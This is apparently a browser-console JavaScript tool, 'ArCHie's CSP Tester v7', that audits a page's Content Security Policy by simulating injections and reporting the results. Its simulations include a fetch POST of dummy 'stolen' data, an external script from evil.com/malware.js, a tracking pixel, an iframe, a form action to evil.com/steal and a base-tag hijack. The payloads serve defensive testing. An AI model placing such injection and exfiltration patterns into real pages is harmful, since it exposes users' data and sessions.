// ArCHie's CSP Tester v7 — Merged & Optimized
(function() {
    console.clear();
    console.log("%c🛡️ CSP Tester v7", "color: #e74c3c; font-weight: bold; font-size: 1.2em;");

    // --- 1. STATE ---
    const REPORT = {
        cspHeader: "Not retrieved",
        cspReportOnly: "Not retrieved",
        violations: [],
        results: {
            eval:      { status: "PENDING", msg: "", payload: "", loc: "" },
            connect:   { status: "PENDING", msg: "", payload: "", loc: "" },
            websocket: { status: "PENDING", msg: "", payload: "", loc: "" },
            script:    { status: "PENDING", msg: "", payload: "", loc: "" },
            inline:    { status: "PENDING", msg: "", payload: "", loc: "" },
            style:     { status: "PENDING", msg: "", payload: "", loc: "" },
            img:       { status: "PENDING", msg: "", payload: "", loc: "" },
            iframe:    { status: "PENDING", msg: "", payload: "", loc: "" },
            form:      { status: "PENDING", msg: "", payload: "", loc: "" },
            object:    { status: "PENDING", msg: "", payload: "", loc: "" },
            baseUri:   { status: "PENDING", msg: "", payload: "", loc: "" },
        }
    };

    document.addEventListener("securitypolicyviolation", (e) => {
        REPORT.violations.push({
            directive: e.violatedDirective,
            blocked: e.blockedURI
        });
    });

    // Open report window NOW (synchronous = user-gesture, avoids popup blocker)
    const reportWin = window.open('', '_blank');
    if (reportWin) {
        reportWin.document.write('<html><head><title>CSP Tester — Running...</title></head><body style="background:#111;color:#ddd;font-family:monospace;padding:40px;text-align:center"><h2 style="color:#e74c3c">🛡️ CSP Tester v7</h2><p>Running attack simulations... please wait.</p></body></html>');
    }

    const testPromises = [];

    // --- 0. FETCH CSP HEADER ---
    testPromises.push(
        fetch(window.location.href, { method: "HEAD" })
            .then(r => {
                REPORT.cspHeader = r.headers.get("content-security-policy") || "No CSP header found";
                REPORT.cspReportOnly = r.headers.get("content-security-policy-report-only") || "None";
            })
            .catch(() => { REPORT.cspHeader = "Could not fetch (CORS/Network)"; REPORT.cspReportOnly = "Could not fetch"; })
    );

    // --- 2. TESTS ---

    // TEST A: Unsafe Eval (script-src 'unsafe-eval')
    testPromises.push(new Promise((resolve) => {
        const payload = "eval('window.csp_check = true')";
        const loc = "JS Runtime (eval)";
        try {
            eval('window.csp_check = true');
            if (window.csp_check) {
                REPORT.results.eval = { status: "FAILED", msg: "Unsafe Eval allowed", payload, loc };
                delete window.csp_check;
            } else {
                REPORT.results.eval = { status: "PASSED", msg: "Eval blocked", payload, loc };
            }
            resolve();
        } catch (e) {
            REPORT.results.eval = { status: "PASSED", msg: "Eval threw error (Blocked)", payload, loc };
            resolve();
        }
    }));

    // TEST B: Data Exfiltration via Fetch (connect-src)
    testPromises.push(new Promise((resolve) => {
        const url = "https://jsonplaceholder.typicode.com/posts";
        const body = '{"stolen":"data"}';
        const payload = `FETCH POST ${url}`;
        const loc = "Network API (fetch)";

        fetch(url, { method: "POST", body })
        .then(r => {
            REPORT.results.connect = r.ok
                ? { status: "FAILED", msg: "Data exfiltrated via Fetch", payload, loc }
                : { status: "WARNING", msg: "Fetch responded non-OK (check Network tab)", payload, loc };
            resolve();
        })
        .catch(() => {
            setTimeout(() => {
                const blocked = REPORT.violations.some(v => v.directive.includes('connect'));
                REPORT.results.connect = blocked
                    ? { status: "PASSED", msg: "Blocked by CSP (connect-src)", payload, loc }
                    : { status: "WARNING", msg: "Failed (CORS/Network — check manually)", payload, loc };
                resolve();
            }, 200);
        });
    }));

    // TEST C: WebSocket exfiltration (connect-src WS bypass)
    testPromises.push(new Promise((resolve) => {
        let done = false;
        const fin = () => { if (!done) { done = true; resolve(); } };
        const wsUrl = "wss://echo.websocket.org";
        const payload = `new WebSocket('${wsUrl}')`;
        const loc = "WebSocket API";
        try {
            const ws = new WebSocket(wsUrl);
            ws.onopen = () => {
                REPORT.results.websocket = { status: "FAILED", msg: "WebSocket connection opened", payload, loc };
                ws.close(); fin();
            };
            ws.onerror = () => {
                setTimeout(() => {
                    const blocked = REPORT.violations.some(v => v.directive.includes('connect'));
                    REPORT.results.websocket = blocked
                        ? { status: "PASSED", msg: "Blocked by CSP (connect-src WS)", payload, loc }
                        : { status: "PASSED", msg: "WS failed (network/CORS)", payload, loc };
                    fin();
                }, 300);
            };
            setTimeout(() => {
                if (REPORT.results.websocket.status === "PENDING") {
                    REPORT.results.websocket = { status: "WARNING", msg: "WS timeout — check manually", payload, loc };
                }
                fin();
            }, 3000);
        } catch (e) {
            REPORT.results.websocket = { status: "PASSED", msg: "WS threw error (Blocked)", payload, loc };
            fin();
        }
    }));

    // TEST D: External Script injection (script-src)
    testPromises.push(new Promise((resolve) => {
        const src = "https://evil.com/malware.js";
        const payload = `<script src="${src}"><\/script>`;
        const loc = "DOM (document.body)";

        const script = document.createElement('script');
        script.src = src;
        script.onload = () => {
            REPORT.results.script = { status: "FAILED", msg: "External Script Loaded", payload, loc };
            script.remove(); resolve();
        };
        script.onerror = () => {
            setTimeout(() => {
                const blocked = REPORT.violations.some(v => v.directive.includes('script'));
                REPORT.results.script = blocked
                    ? { status: "PASSED", msg: "Blocked by CSP (script-src)", payload, loc }
                    : { status: "PASSED", msg: "Failed to load (Network Error)", payload, loc };
                script.remove(); resolve();
            }, 200);
        };
        document.body.appendChild(script);
    }));

    // TEST E: Inline script via appendChild (actually tests CSP script-src)
    testPromises.push(new Promise((resolve) => {
        const payload = "<script>window._inlineCSP=1</script> via appendChild";
        const loc = "DOM appendChild";
        try {
            const script = document.createElement('script');
            script.textContent = 'window._inlineCSP=1';
            document.body.appendChild(script);
            setTimeout(() => {
                if (window._inlineCSP === 1) {
                    REPORT.results.inline = { status: "FAILED", msg: "Inline script executed via appendChild", payload, loc };
                    delete window._inlineCSP;
                } else {
                    REPORT.results.inline = { status: "PASSED", msg: "Inline script blocked by CSP", payload, loc };
                }
                script.remove(); resolve();
            }, 200);
        } catch(e) {
            REPORT.results.inline = { status: "PASSED", msg: "Inline script blocked (exception)", payload, loc };
            resolve();
        }
    }));

    // TEST F: Inline style injection (style-src)
    testPromises.push(new Promise((resolve) => {
        const payload = "<style>body{background:red}</style> via DOM";
        const loc = "DOM (style element)";
        try {
            const style = document.createElement('style');
            style.textContent = 'body { --csp-test-var: 1; }';
            document.head.appendChild(style);
            setTimeout(() => {
                const blocked = REPORT.violations.some(v => v.directive.includes('style'));
                if (blocked) {
                    REPORT.results.style = { status: "PASSED", msg: "Blocked by CSP (style-src)", payload, loc };
                } else {
                    REPORT.results.style = { status: "FAILED", msg: "Inline style injected successfully", payload, loc };
                }
                style.remove(); resolve();
            }, 200);
        } catch(e) {
            REPORT.results.style = { status: "PASSED", msg: "Style injection blocked (exception)", payload, loc };
            resolve();
        }
    }));

    // TEST G: Pixel Tracking (img-src)
    testPromises.push(new Promise((resolve) => {
        const src = "https://evil.com/tracker.png";
        const payload = `<img src="${src}">`;
        const loc = "DOM (Image Object)";

        const img = new Image();
        img.src = src;
        img.onload = () => {
            REPORT.results.img = { status: "FAILED", msg: "Tracking Pixel Loaded", payload, loc };
            resolve();
        };
        img.onerror = () => {
            setTimeout(() => {
                const blocked = REPORT.violations.some(v => v.directive.includes('img'));
                REPORT.results.img = blocked
                    ? { status: "PASSED", msg: "Blocked by CSP (img-src)", payload, loc }
                    : { status: "PASSED", msg: "Failed to load (Network Error)", payload, loc };
                resolve();
            }, 200);
        };
    }));

    // TEST H: iframe injection (frame-src / child-src)
    testPromises.push(new Promise((resolve) => {
        let done = false;
        const fin = () => { if (!done) { done = true; resolve(); } };
        const src = "https://evil.com/frame";
        const payload = `<iframe src="${src}">`;
        const loc = "DOM (iframe)";

        const fr = document.createElement('iframe');
        fr.src = src;
        fr.style.display = "none";
        fr.onload = () => {
            REPORT.results.iframe = { status: "FAILED", msg: "iframe loaded external content", payload, loc };
            fr.remove(); fin();
        };
        fr.onerror = () => {
            setTimeout(() => {
                const blocked = REPORT.violations.some(v => v.directive.includes('frame') || v.directive.includes('child'));
                REPORT.results.iframe = blocked
                    ? { status: "PASSED", msg: "Blocked by CSP (frame-src)", payload, loc }
                    : { status: "PASSED", msg: "Failed to load (Network Error)", payload, loc };
                fr.remove(); fin();
            }, 200);
        };
        document.body.appendChild(fr);
        setTimeout(() => {
            if (REPORT.results.iframe.status === "PENDING") {
                REPORT.results.iframe = { status: "WARNING", msg: "iframe timeout — check manually", payload, loc };
                fr.remove();
            }
            fin();
        }, 3000);
    }));

    // TEST I: Form action hijack (form-action)
    testPromises.push(new Promise((resolve) => {
        const target = "https://evil.com/steal";
        const payload = `<form action="${target}" method="POST">`;
        const loc = "DOM (form action)";
        try {
            const form = document.createElement('form');
            form.action = target;
            form.method = "POST";
            form.style.display = "none";
            document.body.appendChild(form);
            REPORT.results.form = form.action.includes("evil.com")
                ? { status: "WARNING", msg: "form.action set to external URL (submit not triggered)", payload, loc }
                : { status: "PASSED", msg: "form.action rewritten by browser/CSP", payload, loc };
            form.remove(); resolve();
        } catch(e) {
            REPORT.results.form = { status: "PASSED", msg: "form.action threw error", payload, loc };
            resolve();
        }
    }));

    // TEST J: object-src (Flash/plugin embed)
    testPromises.push(new Promise((resolve) => {
        const src = "https://evil.com/plugin.swf";
        const payload = `<object data="${src}">`;
        const loc = "DOM (object element)";

        const obj = document.createElement('object');
        obj.data = src;
        obj.style.display = "none";
        document.body.appendChild(obj);
        setTimeout(() => {
            const blocked = REPORT.violations.some(v => v.directive.includes('object'));
            REPORT.results.object = blocked
                ? { status: "PASSED", msg: "Blocked by CSP (object-src)", payload, loc }
                : { status: "WARNING", msg: "No object-src violation — may be blocked by default", payload, loc };
            obj.remove(); resolve();
        }, 500);
    }));

    // TEST K: base-uri hijack
    testPromises.push(new Promise((resolve) => {
        const href = "https://evil.com/";
        const payload = `<base href="${href}">`;
        const loc = "DOM (base element)";
        try {
            const base = document.createElement('base');
            base.href = href;
            document.head.appendChild(base);
            setTimeout(() => {
                const blocked = REPORT.violations.some(v => v.directive.includes('base'));
                if (blocked) {
                    REPORT.results.baseUri = { status: "PASSED", msg: "Blocked by CSP (base-uri)", payload, loc };
                } else if (document.baseURI.includes("evil.com")) {
                    REPORT.results.baseUri = { status: "FAILED", msg: "base-uri hijacked — document.baseURI changed", payload, loc };
                } else {
                    REPORT.results.baseUri = { status: "WARNING", msg: "base tag added but baseURI unchanged — verify manually", payload, loc };
                }
                base.remove(); resolve();
            }, 200);
        } catch(e) {
            REPORT.results.baseUri = { status: "PASSED", msg: "base-uri blocked (exception)", payload, loc };
            resolve();
        }
    }));

    // --- 3. REPORT ---
    const testLabels = {
        eval: "Unsafe Eval", connect: "Fetch / connect-src", websocket: "WebSocket / connect-src",
        script: "External Script", inline: "Inline Script (appendChild)", style: "Inline Style / style-src",
        img: "Tracking Pixel / img-src", iframe: "iframe / frame-src", form: "Form Action Hijack",
        object: "Object Embed / object-src", baseUri: "Base URI Hijack / base-uri",
    };

    Promise.all(testPromises).then(() => {
        setTimeout(() => {
            const results = REPORT.results;
            const total   = Object.keys(results).length;
            const passed  = Object.values(results).filter(r => r.status === "PASSED").length;
            const failed  = Object.values(results).filter(r => r.status === "FAILED").length;
            const warned  = total - passed - failed;

            const rawJSON = JSON.stringify(REPORT, null, 2);

            const rows = Object.keys(results).map(key => {
                const r = results[key];
                const bc = r.status === 'PASSED' ? 'pass' : r.status === 'FAILED' ? 'fail' : 'warn';
                const dp = r.payload.replace(/</g, "&lt;");
                return `<tr>
                    <td>${testLabels[key] || key}</td>
                    <td><span class="badge ${bc}">${r.status}</span></td>
                    <td>${r.msg}</td>
                    <td><code>${dp}</code></td>
                    <td class="loc">${r.loc}</td>
                </tr>`;
            }).join('');

            const scoreColor = failed === 0 ? "#27ae60" : failed <= 2 ? "#f39c12" : "#c0392b";

            const html = `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>CSP Report — ${window.location.hostname}</title>
<style>
body{background:#111;color:#ddd;font-family:'Segoe UI',monospace;padding:20px}
h2{border-bottom:2px solid #e74c3c;padding-bottom:5px;color:#e74c3c;margin-top:30px}
.box{background:#222;padding:15px;border-radius:5px;margin-bottom:20px;border:1px solid #444}
.csp-hdr{background:#1a1a2e;border:1px solid #9b59b6;padding:12px;border-radius:4px;font-family:monospace;font-size:.85em;color:#c39bd3;word-break:break-all}
textarea{width:100%;height:150px;background:#000;color:#2ecc71;border:1px solid #444;padding:10px;font-family:monospace;font-size:11px}
.score-bar{display:flex;gap:15px;align-items:center;margin:15px 0;font-size:1.1em}
.score-num{font-size:2em;font-weight:bold}
.score-detail{font-size:0.85em;color:#888}
table{width:100%;border-collapse:collapse;margin-top:10px;background:#222}
th,td{padding:10px;border:1px solid #444;text-align:left;font-size:.9em}
th{background:#333;color:#fff}
tr:hover{background:#2a2a2a}
.badge{padding:4px 8px;border-radius:4px;font-weight:bold;font-size:.8em}
.pass{background:#27ae60;color:#fff}
.fail{background:#c0392b;color:#fff}
.warn{background:#f39c12;color:#000}
code{background:#333;padding:2px 4px;border-radius:3px;font-family:monospace;color:#f1c40f;font-size:.85em;word-break:break-all}
.loc{color:#3498db;font-style:italic}
</style></head><body>
<h1>🛡️ ArCHie's CSP Tester v7</h1>
<div class="score-bar">
  <div class="score-num" style="color:${scoreColor}">${passed}/${total}</div>
  <div>
    <div>Tests Passed</div>
    <div class="score-detail"><span style="color:#27ae60">${passed} passed</span> · <span style="color:#c0392b">${failed} failed</span> · <span style="color:#f39c12">${warned} warnings</span></div>
  </div>
</div>

<div class="box">
  <h3>🔒 Active CSP Header</h3>
  <div class="csp-hdr">${REPORT.cspHeader.replace(/</g,"&lt;")}</div>
  ${REPORT.cspReportOnly !== "None" ? `<h3 style="margin-top:12px;">📋 CSP Report-Only</h3><div class="csp-hdr" style="border-color:#f39c12;color:#f5cba7;">${REPORT.cspReportOnly.replace(/</g,"&lt;")}</div>` : ''}
</div>
<div class="box">
  <h3>📄 Raw JSON</h3>
  <textarea id="jsonArea">${rawJSON}</textarea>
</div>

<h2>🧪 Attack Simulation Results</h2>
<table>
  <thead><tr><th>Test</th><th>Status</th><th>Details</th><th>Payload</th><th>Injection Point</th></tr></thead>
  <tbody>${rows}</tbody>
</table>

<h2>🚨 CSP Violations Triggered (${REPORT.violations.length})</h2>
<table>
  <thead><tr><th>Directive</th><th>Blocked URI</th></tr></thead>
  <tbody>${REPORT.violations.length
      ? REPORT.violations.map(v => `<tr><td style="color:#e74c3c">${v.directive}</td><td>${v.blocked}</td></tr>`).join('')
      : '<tr><td colspan="2" style="color:#27ae60;">No violations triggered.</td></tr>'
  }</tbody>
</table>

<script>document.getElementById('jsonArea').select();<\/script>
</body></html>`;

            const blob = new Blob([html], { type: 'text/html;charset=utf-8' });
            const blobUrl = URL.createObjectURL(blob);
            if (reportWin) {
                try {
                    reportWin.document.open();
                    reportWin.document.write(html);
                    reportWin.document.close();
                } catch(e) {
                    reportWin.location.href = blobUrl;
                }
            } else {
                navigator.clipboard.writeText(rawJSON).then(() => {
                    console.log("%c[!] Popup blocked — JSON copied to clipboard!", "color:#e74c3c;font-weight:bold;");
                    alert("⚠️ Popup blocked! Results JSON copied to clipboard.");
                }).catch(() => {
                    console.log("%c[!] Popup blocked. Raw JSON below:", "color:#e74c3c;font-weight:bold;");
                    console.log(rawJSON);
                    alert("⚠️ Popup blocked! Check console (F12) for results.");
                });
            }

        }, 500);
    });
})();